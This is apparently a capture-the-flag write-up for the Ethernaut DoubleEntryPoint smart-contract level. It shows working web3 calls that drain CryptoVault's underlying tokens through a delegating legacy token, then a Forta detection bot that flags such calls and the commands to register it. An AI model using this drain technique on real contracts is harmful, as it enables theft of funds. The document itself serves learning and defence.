> In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.

## Identifying the attack path

The underlying token is located at the address:

```js
await web3.eth.getStorageAt(await contract.cryptoVault(), 1)
// '0x0000000000000000000000004589f2e23db90fb4b6e7f265763b2921cea2df0d'
```

The legacy token is at:

```js
await contract.delegatedFrom()
// '0x4080bD0B76625519c28b2710607ddaF5cBdf8E8f'
```

And this legacy token actually delegates its operations to another token:

```solidity
function transfer(address to, uint256 value) public override returns (bool) {
    if (address(delegate) == address(0)) {
        return super.transfer(to, value);
    } else {
        return delegate.delegateTransfer(to, value, msg.sender);
    }
}
```

The address of the target token is:

```js
// web3.eth.abi.encodeFunctionSignature("delegate()");
const _selector = web3.utils.sha3('delegate()').substring(0, 10) // delegate()
const _legacy = await contract.delegatedFrom()
await web3.eth.call({from: player, to: _legacy, data: _selector})
// '0x0000000000000000000000004589f2e23db90fb4b6e7f265763b2921cea2df0d'
```

So the legacy token actually transfers from the underlying token!

And the underlying is actually the `DoubleEntryPoint` contract:

```js
contract.address
// '0x4589f2e23DB90fB4b6e7f265763b2921cEa2dF0d'
```

Underlying token balance:

```js
const _vault = await contract.cryptoVault()
(await contract.balanceOf(_vault)).toString()
// '100000000000000000000'
```

Now the risk is clear: since the legacy token exposes a different address from the underlying, it bypasses the restrictions in `CryptoVault`:

```solidity
function sweepToken(IERC20 token) public {
    require(token != underlying, "Can't transfer underlying token");
    token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
}
```

So the underlying can be swept through the legacy token:

```js
const _vault = await contract.cryptoVault()
const _legacy = await contract.delegatedFrom()
const _abi = {"inputs": [{"name": "token", "type": "address"}], "name": "sweepToken", "type": "function"};
const _data = web3.eth.abi.encodeFunctionCall(_abi, [_legacy])
await web3.eth.sendTransaction({from: player, to: _vault, data: _data})
(await contract.balanceOf(_vault)).toString()
// '0'
```

## Scanning the calls

So... The legacy token delegates the transfers to the double-entry token, which is the underlying token of the vault!

Then `delegate.delegateTransfer(to, value, msg.sender)` in `LegacyToken` actually calls `delegateTransfer` on `DoubleEntryPoint`.
This function is monitored by Forta thanks to the modifier `fortaNotify`.

To analyse the transaction, the call data is passed on to the detection bot.

Debugging the transaction of an actual attack will provide an actua example and help with analysing `msg.data`.

First, we need the selector to locate the calls to `delegateTransfer`:

```js
web3.utils.sha3('delegateTransfer(address,uint256,address)').substring(0, 10)
// '0x9cd1a121'
```

[According to Tenderly][debugging-attack-transaction], this selector received the following data:

```
0x9cd1a121000000000000000000000000aad026992b0065d4a9c7019b082cb748d042411f0000000000000000000000000000000000000000000000056bc75e2d631000000000000000000000000000009014ef724746451463efbc761d57f60af06bf9a9
```

The last 20 bytes are the address of the vault, `0x9014eF724746451463EFbc761d57f60aF06BF9A9`.
This is the IOC for the attack, it can be easily parsed from the input arguments and checked for:

```solidity
(,,address _origin) = abi.decode(data[4:], (address, uint256, address));
if (_origin == _vault) {
    IForta(msg.sender).raiseAlert(user);
}
```

And finally the bot can be registered with:

```js
const _forta = await contract.forta()
const _bot = '0x6bD1D6bA42875b3d00F1f44d6F50da5b58Fb0C82'
const _abi = {"inputs": [{"name": "detectionBotAddress", "type": "address"}], "name": "setDetectionBot", "type": "function"};
const _data = web3.eth.abi.encodeFunctionCall(_abi, [_bot])
await web3.eth.sendTransaction({from: player, to: _forta, data: _data})
```

Submiting the level will trigger a sweep and should raise an alert :)

[debugging-attack-transaction]: https://dashboard.tenderly.co/tx/sepolia/0x0b5a962e87623ade5d699ba25a55f0a2b683a7d8116cfa82fda6ecc8de3d243f?trace=0.0.0
